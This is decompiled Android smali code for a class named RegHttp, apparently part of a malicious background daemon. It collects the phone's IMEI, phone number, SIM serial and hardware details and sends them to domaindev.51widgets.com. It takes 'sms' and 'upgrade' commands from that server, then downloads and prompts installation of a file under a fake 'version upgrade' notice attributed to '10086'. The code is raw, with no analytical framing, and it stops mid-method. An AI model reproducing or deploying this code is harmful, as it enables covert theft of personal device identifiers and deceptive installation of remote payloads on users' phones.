.class public LDaemon/Global/RegHttp;
.super Ljava/lang/Object;
.source "RegHttp.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field static final channe:I = 0x605c380

.field private static final privateKey:Ljava/lang/String; = "test"

.field private static final url:Ljava/lang/String; = "http://domaindev.51widgets.com/ss/service/action.php?action=domregbycode"

.field static final version:I = 0x65


# instance fields
.field private address:Ljava/lang/String;

.field private cpu:Ljava/lang/String;

.field private htype:Ljava/lang/String;

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private passWord:Ljava/lang/String;

.field private ram:Ljava/lang/String;

.field private res:Ljava/lang/String;

.field private rom:Ljava/lang/String;

.field private sign:Ljava/lang/String;

.field private sms:I

.field private tel:Ljava/lang/String;

.field private updatemode:I

.field private upgrade:I

.field private z:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 5

    .prologue
    const/4 v2, 0x1

    const-string v4, "1"

    const-string v3, "RegHttp"

    .line 49
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 27
    const-string v1, "imei"

    iput-object v1, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    .line 28
    const-string v1, "12345678911"

    iput-object v1, p0, LDaemon/Global/RegHttp;->tel:Ljava/lang/String;

    .line 29
    const-string v1, "sign"

    iput-object v1, p0, LDaemon/Global/RegHttp;->sign:Ljava/lang/String;

    .line 30
    const-string v1, "imsi"

    iput-object v1, p0, LDaemon/Global/RegHttp;->imsi:Ljava/lang/String;

    .line 31
    const-string v1, "htype"

    iput-object v1, p0, LDaemon/Global/RegHttp;->htype:Ljava/lang/String;

    .line 32
    const-string v1, "res"

    iput-object v1, p0, LDaemon/Global/RegHttp;->res:Ljava/lang/String;

    .line 33
    const-string v1, "cpu"

    iput-object v1, p0, LDaemon/Global/RegHttp;->cpu:Ljava/lang/String;

    .line 34
    const-string v1, "rom"

    iput-object v1, p0, LDaemon/Global/RegHttp;->rom:Ljava/lang/String;

    .line 35
    const-string v1, "ram"

    iput-object v1, p0, LDaemon/Global/RegHttp;->ram:Ljava/lang/String;

    .line 38
    const-string v1, "domaindev.51widgets.com"

    iput-object v1, p0, LDaemon/Global/RegHttp;->address:Ljava/lang/String;

    .line 39
    const-string v1, "1"

    iput-object v4, p0, LDaemon/Global/RegHttp;->passWord:Ljava/lang/String;

    .line 40
    const-string v1, "1"

    iput-object v4, p0, LDaemon/Global/RegHttp;->z:Ljava/lang/String;

    .line 41
    iput v2, p0, LDaemon/Global/RegHttp;->sms:I

    .line 42
    iput v2, p0, LDaemon/Global/RegHttp;->upgrade:I

    .line 47
    const/4 v1, 0x0

    iput v1, p0, LDaemon/Global/RegHttp;->updatemode:I

    .line 51
    sget-object v1, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 53
    .local v0, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    .line 55
    iget-object v1, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    if-nez v1, :cond_0

    .line 56
    const-string v1, "imeitest"

    iput-object v1, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    .line 58
    :cond_0
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, LDaemon/Global/RegHttp;->tel:Ljava/lang/String;

    .line 60
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, LDaemon/Global/RegHttp;->imsi:Ljava/lang/String;

    .line 61
    iget-object v1, p0, LDaemon/Global/RegHttp;->imsi:Ljava/lang/String;

    if-nez v1, :cond_1

    .line 62
    const-string v1, "imsitest"

    iput-object v1, p0, LDaemon/Global/RegHttp;->imsi:Ljava/lang/String;

    .line 63
    :cond_1
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    iput-object v1, p0, LDaemon/Global/RegHttp;->htype:Ljava/lang/String;

    .line 71
    const-string v1, "320X480"

    iput-object v1, p0, LDaemon/Global/RegHttp;->res:Ljava/lang/String;

    .line 72
    sget-object v1, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    iput-object v1, p0, LDaemon/Global/RegHttp;->cpu:Ljava/lang/String;

    .line 73
    sget-object v1, Landroid/os/Build;->BOARD:Ljava/lang/String;

    iput-object v1, p0, LDaemon/Global/RegHttp;->rom:Ljava/lang/String;

    .line 74
    sget-object v1, Landroid/os/Build;->BRAND:Ljava/lang/String;

    iput-object v1, p0, LDaemon/Global/RegHttp;->ram:Ljava/lang/String;

    .line 77
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "imei:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "tel:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->tel:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "imeisign:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->sign:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 80
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "imsi:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->imsi:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 81
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "htype:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->htype:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 82
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "res:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->res:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 83
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "cpu:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->cpu:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 84
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "rom:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->rom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 85
    const-string v1, "RegHttp"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ram:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->ram:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 87
    return-void
.end method


# virtual methods
.method public download()Z
    .locals 12

    .prologue
    const/16 v1, 0x64

    const/4 v5, 0x1

    const-string v11, "BootReceiver"

    .line 222
    iget v0, p0, LDaemon/Global/RegHttp;->upgrade:I

    if-nez v0, :cond_4

    iget v0, p0, LDaemon/Global/RegHttp;->updatemode:I

    if-nez v0, :cond_4

    .line 223
    const-string v0, "RerviceHttp"

    const-string v2, "update"

    invoke-static {v0, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 224
    iput v5, p0, LDaemon/Global/RegHttp;->updatemode:I

    .line 226
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v0

    const-string v2, "mounted"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 231
    const/4 v10, 0x1

    .line 232
    .local v10, "update":Z
    :goto_0
    if-nez v10, :cond_0

    .line 253
    :try_start_0
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, LDaemon/DownLoad/FileDownloader;->download(LDaemon/DownLoad/DownloadProgressListener;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 261
    .end local v10    # "update":Z
    :goto_1
    const/4 v0, 0x0

    .line 264
    :goto_2
    return v0

    .line 234
    .restart local v10    # "update":Z
    :cond_0
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    const-string v3, "\u7248\u672c\u5347\u7ea7"

    const-string v4, "\u70b9\u51fb\u786e\u8ba4\u5b89\u88c5!"

    const-string v6, "10086"

    iget-object v7, p0, LDaemon/Global/RegHttp;->address:Ljava/lang/String;

    move v2, v1

    invoke-virtual/range {v0 .. v7}, LDaemon/DownLoad/FileDownloader;->setType(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)I

    move-result v9

    .line 236
    .local v9, "type":I
    const/4 v0, 0x2

    if-ne v9, v0, :cond_1

    .line 237
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    iget-object v2, p0, LDaemon/Global/RegHttp;->address:Ljava/lang/String;

    const/4 v3, 0x3

    invoke-virtual {v0, v2, v3}, LDaemon/DownLoad/FileDownloader;->UpdateFileDownloader(Ljava/lang/String;I)V

    .line 238
    const/4 v10, 0x0

    goto :goto_0

    .line 239
    :cond_1
    if-nez v9, :cond_2

    .line 241
    const-wide/16 v2, 0x1388

    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 242
    :catch_0
    move-exception v8

    .line 243
    .local v8, "e":Ljava/lang/Exception;
    const-string v0, "BootReceiver"

    const-string v0, "Down wait error:"

    invoke-static {v11, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 246
    .end local v8    # "e":Ljava/lang/Exception;
    :cond_2
    const/4 v10, 0x0

    goto :goto_0

    .line 254
    .end local v9    # "type":I
    :catch_1
    move-exception v0

    move-object v8, v0

    .line 255
    .restart local v8    # "e":Ljava/lang/Exception;
    const-string v0, "BootReceiver"

    const-string v0, "Down Load error"

    invoke-static {v11, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 258
    .end local v8    # "e":Ljava/lang/Exception;
    .end local v10    # "update":Z
    :cond_3
    sput v5, LHamsterSuper/Client/Deamon/BootReceiver;->mode:I

    goto :goto_1

    .line 263
    :cond_4
    sput v5, LHamsterSuper/Client/Deamon/BootReceiver;->mode:I

    move v0, v5

    .line 264
    goto :goto_2
.end method

.method public getAddress()Ljava/lang/String;
    .locals 1

    .prologue
    .line 155
    iget-object v0, p0, LDaemon/Global/RegHttp;->address:Ljava/lang/String;

    return-object v0
.end method

.method public getHttpUrl()Ljava/lang/String;
    .locals 5

    .prologue
    const-string v4, "UTF-8"

    .line 177
    const-string v0, ""

    .line 178
    .local v0, "URL":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "&code="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&imsi="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->imsi:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&sign="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->sign:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 179
    const-string v2, "&htype="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->htype:Ljava/lang/String;

    const-string v3, "UTF-8"

    invoke-static {v2, v4}, LDaemon/Base/URLEncoder;->m97a57645(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&cpu="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->cpu:Ljava/lang/String;

    const-string v3, "UTF-8"

    invoke-static {v2, v4}, LDaemon/Base/URLEncoder;->m97a57645(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 180
    const-string v2, "&rom="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->rom:Ljava/lang/String;

    const-string v3, "UTF-8"

    invoke-static {v2, v4}, LDaemon/Base/URLEncoder;->m97a57645(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&ram="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->ram:Ljava/lang/String;

    const-string v3, "UTF-8"

    invoke-static {v2, v4}, LDaemon/Base/URLEncoder;->m97a57645(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 181
    const-string v2, "&res="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->res:Ljava/lang/String;

    const-string v3, "UTF-8"

    invoke-static {v2, v4}, LDaemon/Base/URLEncoder;->m97a57645(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&tel="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, LDaemon/Global/RegHttp;->tel:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 182
    const-string v2, "&version="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const/16 v2, 0x65

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&channe="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const v2, 0x605c380

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 178
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 183
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://domaindev.51widgets.com/ss/service/action.php?action=domregbycode"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public getImei()Ljava/lang/String;
    .locals 1

    .prologue
    .line 139
    iget-object v0, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    return-object v0
.end method

.method public getPassWord()Ljava/lang/String;
    .locals 1

    .prologue
    .line 148
    iget-object v0, p0, LDaemon/Global/RegHttp;->passWord:Ljava/lang/String;

    return-object v0
.end method

.method public getSms()I
    .locals 1

    .prologue
    .line 124
    iget v0, p0, LDaemon/Global/RegHttp;->sms:I

    return v0
.end method

.method public getUpgrade()I
    .locals 1

    .prologue
    .line 131
    iget v0, p0, LDaemon/Global/RegHttp;->upgrade:I

    return v0
.end method

.method public getuser_value()Ljava/lang/String;
    .locals 1

    .prologue
    .line 163
    iget-object v0, p0, LDaemon/Global/RegHttp;->z:Ljava/lang/String;

    return-object v0
.end method

.method public parsePackage(Ljava/lang/String;)I
    .locals 5
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    const-string v4, "http"

    .line 190
    const-string v2, "http"

    const-string v2, "parsePackage state:start"

    invoke-static {v4, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 192
    const-string v2, "<msg>"

    invoke-virtual {p1, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_0

    .line 193
    const-string v2, "msg"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, LDaemon/Service/RerviceHttp;->msg:Ljava/lang/String;

    .line 194
    const/4 v2, 0x2

    .line 211
    :goto_0
    return v2

    .line 199
    :cond_0
    :try_start_0
    const-string v2, "mdpassword"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 200
    .local v1, "z":Ljava/lang/String;
    invoke-virtual {p0, v1}, LDaemon/Global/RegHttp;->setuser_value(Ljava/lang/String;)V

    .line 201
    const-string v2, "address"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, LDaemon/Global/RegHttp;->address:Ljava/lang/String;

    .line 202
    const-string v2, "sms"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, p0, LDaemon/Global/RegHttp;->sms:I

    .line 203
    const-string v2, "upgrade"

    invoke-static {p1, v2}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, p0, LDaemon/Global/RegHttp;->upgrade:I

    .line 204
    invoke-virtual {p0, p1}, LDaemon/Global/RegHttp;->starthead(Ljava/lang/String;)V

    .line 205
    invoke-virtual {p0}, LDaemon/Global/RegHttp;->saverms()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 209
    const-string v2, "http"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "parsePackage state:end z:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, LDaemon/Global/RegHttp;->z:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v4, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 211
    const/4 v2, 0x1

    goto :goto_0

    .line 206
    .end local v1    # "z":Ljava/lang/String;
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 207
    .local v0, "e":Ljava/lang/Exception;
    const/4 v2, 0x0

    goto :goto_0
.end method

.method public readrms()Z
    .locals 8

    .prologue
    const/4 v7, 0x0

    const/4 v5, 0x1

    const-string v6, "imei"

    .line 104
    const/16 v2, 0x8

    new-array v0, v2, [Ljava/lang/String;

    .line 105
    const-string v2, "z"

    aput-object v2, v0, v7

    iget-object v2, p0, LDaemon/Global/RegHttp;->z:Ljava/lang/String;

    aput-object v2, v0, v5

    const/4 v2, 0x2

    .line 106
    const-string v3, "version"

    aput-object v3, v0, v2

    const/4 v2, 0x3

    const-string v3, "101"

    aput-object v3, v0, v2

    const/4 v2, 0x4

    .line 107
    const-string v3, "channe"

    aput-object v3, v0, v2

    const/4 v2, 0x5

    const-string v3, "101041024"

    aput-object v3, v0, v2

    const/4 v2, 0x6

    .line 108
    const-string v3, "imei"

    aput-object v6, v0, v2

    const/4 v2, 0x7

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v2

    .line 110
    .local v0, "key":[Ljava/lang/String;
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    const/16 v3, 0x3e8

    invoke-static {v2, v3, v0}, LDaemon/Base/Rms;->mecae1311(Landroid/content/Context;I[Ljava/lang/String;)Ljava/util/Map;

    move-result-object v1

    .line 112
    .local v1, "temp":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    const-string v2, "imei"

    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    if-nez v2, :cond_0

    move v2, v5

    .line 119
    :goto_0
    return v2

    .line 114
    :cond_0
    const-string v2, "imei"

    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    iput-object v2, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    .line 115
    iget-object v2, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    iget-object v3, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_1

    move v2, v5

    .line 116
    goto :goto_0

    .line 118
    :cond_1
    sput v5, LHamsterSuper/Client/Deamon/BootReceiver;->mode:I

    move v2, v7

    .line 119
    goto :goto_0
.end method

.method public saverms()V
    .locals 5

    .prologue
    .line 90
    const/16 v2, 0x8

    new-array v1, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    .line 91
    const-string v3, "z"

    aput-object v3, v1, v2

    const/4 v2, 0x1

    iget-object v3, p0, LDaemon/Global/RegHttp;->z:Ljava/lang/String;

    aput-object v3, v1, v2

    const/4 v2, 0x2

    .line 92
    const-string v3, "version"

    aput-object v3, v1, v2

    const/4 v2, 0x3

    const-string v3, "101"

    aput-object v3, v1, v2

    const/4 v2, 0x4

    .line 93
    const-string v3, "channe"

    aput-object v3, v1, v2

    const/4 v2, 0x5

    const-string v3, "101041024"

    aput-object v3, v1, v2

    const/4 v2, 0x6

    .line 94
    const-string v3, "imei"

    aput-object v3, v1, v2

    const/4 v2, 0x7

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 97
    .local v1, "key":[Ljava/lang/String;
    :try_start_0
    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    const/16 v3, 0x3e8

    invoke-static {v2, v3, v1}, LDaemon/Base/Rms;->m43781db5(Landroid/content/Context;I[Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 102
    :goto_0
    return-void

    .line 98
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 99
    .local v0, "e":Ljava/lang/Exception;
    const-string v2, "BootReceiver"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "RMS"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

